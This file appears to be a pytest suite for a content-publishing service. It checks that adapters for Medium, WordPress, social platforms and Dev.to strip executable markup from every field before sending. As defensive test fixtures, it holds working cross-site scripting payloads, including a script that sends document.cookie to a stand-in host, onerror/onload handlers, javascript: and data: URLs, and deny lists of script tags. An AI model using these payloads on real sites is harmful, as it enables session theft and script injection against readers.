"""Hostile input in *every* field, checked against what actually goes on the wire.

``test_a_published_post_carries_no_script.py`` proves ``formatting.to_html`` is
safe. This proves the adapters are, which is not the same claim and is the one
that matters to a reader: the thing a platform receives is not ``to_html``'s
output, it is a payload an adapter *assembled*, and every adapter assembles it
by concatenating that output with other fields.

Medium's is three pieces glued together —

    lead_image_html(cover, alt=title) + f"<h1>{_escape(title)}</h1>" + to_html(body)

— and only the third has been through the sanitiser. The other two are safe
because of an escape and a validator somewhere else entirely, which is exactly
the kind of safety that survives until somebody adds a fourth term. Checking the
assembled payload rather than the function keeps the guarantee attached to the
thing that reaches the reader.

The vectors go in *every* field, not just the body. A generated piece has its
title, excerpt, meta description, tags and keywords written by the same sampler
as its body, from the same third-party text — there is no field here that is
more trusted than another, and the fields that are not the body are the ones
nobody thinks to check.

Two boundaries are deliberately drawn rather than asserted away, and both are
named in tests below so that moving one is a decision rather than an accident:
markdown-native destinations receive the body verbatim, and the Git destination
writes a file into the user's own repository.
"""
from __future__ import annotations

import contextlib

import httpx
import pytest

from app.models.publication import Platform
from app.schemas.content import ContentCreate
from app.services.publishers import base, formatting, get_adapter
from app.services.publishers.base import PublishError, PublishRequest

# --------------------------------------------------------------------------- #
# The vectors                                                                  #
# --------------------------------------------------------------------------- #

#: Elements that must not exist in published markup, whatever they contain.
_FORBIDDEN_TAGS = frozenset(
    {"script", "iframe", "object", "embed", "svg", "form", "style", "base", "link"}
)

#: Schemes a link or an image may point at. Anything else is dropped —
#: ``javascript:`` because it executes, ``data:`` because it is how an image
#: smuggles a script past a reviewer who only read the tag name.
_ALLOWED_SCHEMES = ("http:", "https:", "mailto:", "/", "#", "")

#: Substrings that must not appear in text a platform will *not* parse as
#: markup — a social post, a plain-text field. There the harm is not execution,
#: it is Pulse posting somebody else's payload under the author's name.
_FORBIDDEN = (
    "<script",
    "</script",
    "javascript:",
    "onerror=",
    "onload=",
    "<iframe",
    "<svg",
)


def _executable(html: str) -> list[str]:
    """Everything in *html* a browser would run, described.

    Parsed rather than grepped, because the two give different answers and only
    one of them is the question. ``onerror="alert(1)"`` appearing inside an
    escaped ``<h1>`` is text — it is what a post *about* an attack looks like,
    and Pulse publishes those. The same string as a real attribute on a real
    tag is the bug. A substring match cannot tell them apart; a parser is what
    the reader's browser will use, so it is what this uses.
    """
    from bs4 import BeautifulSoup

    soup = BeautifulSoup(html, "html.parser")
    found: list[str] = []

    for tag in soup.find_all(True):
        if tag.name.lower() in _FORBIDDEN_TAGS:
            found.append(f"<{tag.name}>")
        for attribute, value in tag.attrs.items():
            if attribute.lower().startswith("on"):
                found.append(f"{tag.name}[{attribute}]")
            if attribute.lower() in {"href", "src", "srcdoc", "action", "formaction"}:
                raw = (value if isinstance(value, str) else " ".join(value)).strip()
                if attribute.lower() == "srcdoc":
                    found.append(f"{tag.name}[srcdoc]")
                elif not raw.lower().startswith(_ALLOWED_SCHEMES):
                    found.append(f"{tag.name}[{attribute}={raw[:40]}]")
    return found

#: One string carrying several shapes of attack at once. Used as the value of
#: every text field, so a payload assembled from any of them fails.
_HOSTILE = (
    "<script>fetch('//e.test/'+document.cookie)</script>"
    '<img src=x onerror="alert(1)">'
    '<a href="javascript:alert(1)">click</a>'
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
    '<svg/onload=alert(1)>'
    "\"><script>alert(1)</script>"
)

_HOSTILE_REQUEST = PublishRequest(
    title=f"Release notes {_HOSTILE}",
    body_markdown=f"# Heading\n\n{_HOSTILE}\n\nA real paragraph of text.",
    excerpt=f"Summary {_HOSTILE}",
    meta_description=f"Meta {_HOSTILE}",
    tags=["python", _HOSTILE],
    keywords=["scheduling", _HOSTILE],
    focus_keyword=_HOSTILE,
    slug="release-notes",
    canonical_url="https://blog.example.test/release-notes",
    project_url="https://blog.example.test",
    project_name=f"Example {_HOSTILE}",
    cover_image_url="https://cdn.example.test/cover.png",
)

_CREDENTIALS: dict[Platform, dict[str, str]] = {
    # With a publication id, so the adapter posts straight to it rather than
    # calling ``_me`` first — the empty 200 this fixture answers with is not a
    # usable account lookup, and the request under inspection is the POST.
    Platform.MEDIUM: {
        "integration_token": "medium-token",
        "publication_id": "pub-1",
    },
    Platform.WORDPRESS: {
        "site_url": "https://blog.example.test",
        "username": "author",
        "application_password": "wp-password",
    },
}

#: The adapters that send **HTML** — the ones Pulse sanitises for, because the
#: bytes it sends are the bytes a browser will parse.
_HTML_PLATFORMS = [Platform.MEDIUM, Platform.WORDPRESS]


@pytest.fixture(autouse=True)
def no_waiting(monkeypatch):
    monkeypatch.setattr(base, "_sleep", lambda _: None)


@pytest.fixture(autouse=True)
def resolves_public(monkeypatch):
    monkeypatch.setattr(base.link_check, "unreachable_reason", lambda url: None)


@pytest.fixture
def outgoing(monkeypatch):
    """Capture everything the adapter tries to send."""
    calls: list[dict] = []

    def fake_request(method, url, **kwargs):
        calls.append({"method": method, "url": url, **kwargs})
        return httpx.Response(
            200, json={}, request=httpx.Request(method, "https://platform.test/api")
        )

    monkeypatch.setattr(base.httpx, "request", fake_request)
    return calls


def _payload(adapter, calls, request=_HOSTILE_REQUEST) -> dict:
    """The body of the write this adapter sent."""
    # The empty 200 is not a valid response; what went out is the point.
    with contextlib.suppress(PublishError):
        adapter.publish(request, _CREDENTIALS[adapter.platform])
    writes = [c for c in calls if c["method"] in {"POST", "PUT", "PATCH"}]
    assert writes, f"{adapter.display_name} sent no write to inspect"
    return writes[-1].get("json") or {}


def _markup(adapter, calls, request=_HOSTILE_REQUEST) -> str:
    """The field Pulse composed as HTML and the platform will render as HTML.

    The distinction this draws is the whole point of the file. ``content`` is
    markup *Pulse wrote*: it concatenates the sanitiser's output with a lead
    image and, on Medium, an ``<h1>``, and a browser parses the result. Every
    other field — ``title``, ``excerpt``, the Yoast meta — is a **data** field
    that the platform escapes when it renders it, and Pulse sends it as typed
    for the same reason it does not strip apostrophes: it is the author's text,
    not Pulse's markup.

    So a vector in ``title`` is not a finding here, and a vector in ``content``
    is. What must hold for the data fields is a different claim, checked
    separately: wherever Pulse *interpolates* one of them into markup of its
    own, it escapes it first.
    """
    return str(_payload(adapter, calls, request).get("content", ""))


# --------------------------------------------------------------------------- #
# The HTML platforms                                                           #
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "platform", _HTML_PLATFORMS, ids=[p.value for p in _HTML_PLATFORMS]
)
def test_nothing_executable_reaches_a_platform_that_renders_html(platform, outgoing):
    """The assembled payload, not the sanitiser, is what a reader gets.

    Medium and WordPress both sanitise their own input, and that is the argument
    for doing it here *as well as* rather than *instead of*: whichever of the
    two relaxes first is the one nobody is watching, and Pulse would learn
    about it from the author's readers, on the author's domain, under the
    author's name.
    """
    adapter = get_adapter(platform)

    markup = _markup(adapter, outgoing)

    assert not _executable(markup), (
        f"{adapter.display_name} would publish this to a reader: "
        f"{_executable(markup)}"
    )


@pytest.mark.parametrize(
    "platform", _HTML_PLATFORMS, ids=[p.value for p in _HTML_PLATFORMS]
)
def test_the_real_words_still_survive(platform, outgoing):
    """The other half, or the test above is satisfied by sending nothing.

    A sanitiser that empties the post passes every assertion about what must not
    appear. What must appear is the writing.
    """
    adapter = get_adapter(platform)

    markup = _markup(adapter, outgoing)

    assert "A real paragraph of text." in markup
    assert "Heading" in markup


@pytest.mark.parametrize(
    "platform", _HTML_PLATFORMS, ids=[p.value for p in _HTML_PLATFORMS]
)
def test_a_hostile_title_cannot_break_out_of_the_lead_image(platform, outgoing):
    """The cover image is prepended *outside* the sanitiser.

    ``lead_image_html`` interpolates the cover URL and the title into two
    double-quoted HTML attributes, and the result is concatenated onto
    ``to_html``'s output rather than passed through ``sanitize_html`` with it.
    So the escaping in ``escape_attribute`` is the only thing standing between a
    title and an ``onerror=`` on a tag Pulse wrote itself.

    Worth its own test rather than leaving it to the sweep above, because this
    is the one place a *non-body* field is interpolated into markup by Pulse
    rather than merely carried.
    """
    adapter = get_adapter(platform)

    markup = _markup(adapter, outgoing)

    # The figure exists, its src is the cover, and the hostile title is in the
    # alt attribute as *text* — not as a second tag, and not having closed the
    # attribute early with the quote in it.
    from bs4 import BeautifulSoup

    figure = BeautifulSoup(markup, "html.parser").find("img")
    assert figure is not None
    assert figure["src"] == "https://cdn.example.test/cover.png"
    assert figure["alt"].startswith("Release notes <script>")
    assert not _executable(markup)


def test_the_lead_image_url_cannot_carry_a_scheme_the_sanitiser_would_strip():
    """What keeps the unsanitised concatenation sound, stated where it is used.

    ``sanitize_html`` allows ``http``, ``https`` and ``mailto`` and drops the
    rest — ``javascript:`` because it executes, ``data:`` because it is how an
    image smuggles a script past a reviewer who only read the tag name. The lead
    image never goes through it, so the same guarantee has to come from the
    other end: nothing that is not an absolute http(s) URL can be stored as a
    cover in the first place.

    Pinned against the schema rather than the adapter because that validator is
    the *only* thing holding this up, and it is three modules away from the
    concatenation that depends on it.
    """
    for hostile in (
        "javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "/static/cover.png",
        'x" onerror="alert(1)',
    ):
        with pytest.raises(ValueError):
            ContentCreate(
                project_id=1,
                title="A piece",
                body_markdown="Words.",
                cover_image_url=hostile,
            )


def test_an_http_cover_is_still_accepted():
    """The negative test above is worthless if the field refuses everything."""
    ok = ContentCreate(
        project_id=1,
        title="A piece",
        body_markdown="Words.",
        cover_image_url="https://cdn.example.test/cover.png",
    )
    assert ok.cover_image_url == "https://cdn.example.test/cover.png"


# --------------------------------------------------------------------------- #
# The platforms that take text rather than markup                              #
# --------------------------------------------------------------------------- #

#: Each social destination and how it turns a request into the text it posts.
_SOCIAL = [
    ("mastodon", Platform.MASTODON, lambda a, r: a.build_status(r)),
    ("bluesky", Platform.BLUESKY, lambda a, r: a.build_text(r)),
    ("linkedin", Platform.LINKEDIN, lambda a, r: a.build_commentary(r)),
    ("twitter", Platform.TWITTER, lambda a, r: " ".join(a.build_thread(r))),
]


@pytest.fixture
def hostile_content(db, project):
    """A stored piece whose every field is hostile, including its excerpt.

    Built as a row and put through ``publishing_service.build_request`` rather
    than constructing a ``PublishRequest`` by hand, because the defence being
    tested lives in that function. A hand-built request would skip it and the
    test would be asserting about a value object nobody makes that way.
    """
    from app.models.content import Content
    from app.models.content import ContentType as CT

    row = Content(
        project_id=project.id,
        content_type=CT.ANNOUNCEMENT,
        title=f"Release notes {_HOSTILE}",
        slug="release-notes",
        body_markdown=f"# Heading\n\n{_HOSTILE}\n\nA real paragraph of text.",
        excerpt=f"Summary {_HOSTILE}",
        meta_description="Meta description.",
        tags=["python"],
    )
    db.add(row)
    db.commit()
    db.refresh(row)
    return row


@pytest.mark.parametrize(
    "platform, build",
    [(p, b) for _, p, b in _SOCIAL],
    ids=[name for name, _, _ in _SOCIAL],
)
def test_a_social_post_carries_no_markup_and_no_script_body(
    platform, build, hostile_content
):
    """The subtler half of the plain-text case, and the field it was missing.

    A social composer flattens the *body* with ``to_plain_text``, which renders
    to HTML and strips the tags. Before the sanitiser existed that read a
    script's body as ordinary prose: the tag disappeared and ``alert('xss')``
    went out as part of the post — not executable, but Pulse posting an
    attacker's string under the author's name.

    The excerpt got none of that, and the excerpt is the *first* term in all
    four of these composers (``excerpt or title``, ``excerpt or body or
    title``): the flattened body is the fallback that only runs when there is no
    excerpt, and a generated piece always has one. So the defended path was the
    one that rarely executes. Fixed in ``publishing_service.build_request``.

    Two assertions, because dropping the markup is only half of it: the text
    that was *inside* the markup must not survive either.
    """
    from app.services import publishing_service

    request = publishing_service.build_request(hostile_content, platform=platform)
    composed = build(get_adapter(platform), request).lower()

    for vector in _FORBIDDEN:
        assert vector not in composed, f"a {platform.value} post would carry {vector!r}"
    assert "document.cookie" not in composed
    assert "alert(1)" not in composed


@pytest.mark.parametrize(
    "platform, build",
    [(p, b) for _, p, b in _SOCIAL],
    ids=[name for name, _, _ in _SOCIAL],
)
def test_a_social_post_still_says_something(platform, build, hostile_content):
    """Flattening must leave a post, not an empty string.

    The composers fall back through ``excerpt or title``, so an excerpt that
    flattened to nothing would silently promote the title — which is the
    behaviour a piece with no excerpt should get, not a piece whose excerpt was
    removed by a defence.
    """
    from app.services import publishing_service

    request = publishing_service.build_request(hostile_content, platform=platform)
    composed = build(get_adapter(platform), request)

    assert "Summary" in composed


# --------------------------------------------------------------------------- #
# The boundaries, named on purpose                                             #
# --------------------------------------------------------------------------- #


def test_a_markdown_destination_receives_the_body_as_written():
    """Dev.to, Hashnode and Buttondown are sent Markdown, not HTML.

    Pulse does not sanitise it, and this test says so rather than leaving it to
    be inferred. The reasoning: the body is Markdown until *their* renderer runs,
    each of those platforms sanitises its own output, and rendering here to
    sanitise would mean sending HTML to an API that documents a Markdown field —
    changing what is published in order to defend a rendering Pulse does not do.

    ``sanitize_html`` covers the destinations Pulse hands finished markup to.
    This is the boundary of that claim, and moving it is a product decision
    about what Pulse is allowed to edit, not a bug fix.
    """
    adapter = get_adapter(Platform.DEVTO)
    calls: list[dict] = []

    def fake_request(method, url, **kwargs):
        calls.append({"method": method, **kwargs})
        return httpx.Response(
            200, json={}, request=httpx.Request(method, "https://dev.to/api")
        )

    monkeypatch = pytest.MonkeyPatch()
    monkeypatch.setattr(base.httpx, "request", fake_request)
    try:
        with contextlib.suppress(PublishError):
            adapter.publish(_HOSTILE_REQUEST, {"api_key": "k"})
    finally:
        monkeypatch.undo()

    sent = calls[-1]["json"]["article"]["body_markdown"]
    # Stated as an equality against the input, so that a future change to
    # sanitise this path fails here and has to be made deliberately rather than
    # silently changing what a user's post says.
    assert sent == _HOSTILE_REQUEST.body_markdown


def test_tags_are_stripped_to_something_a_platform_can_take():
    """Whatever else a tag is, it is not markup by the time it is sent.

    Tags come out of the same sampler as the body and reach a published artefact
    directly — Dev.to renders them as the post's public tags. ``normalize_tags``
    exists for the platforms' own format rules, and the useful side effect is
    that nothing with a bracket in it survives.
    """
    normalized = formatting.normalize_tags(_HOSTILE_REQUEST.tags, limit=4)

    for tag in normalized:
        assert "<" not in tag and ">" not in tag
        assert "script" not in tag.lower() or tag.isalnum()
    assert "python" in normalized
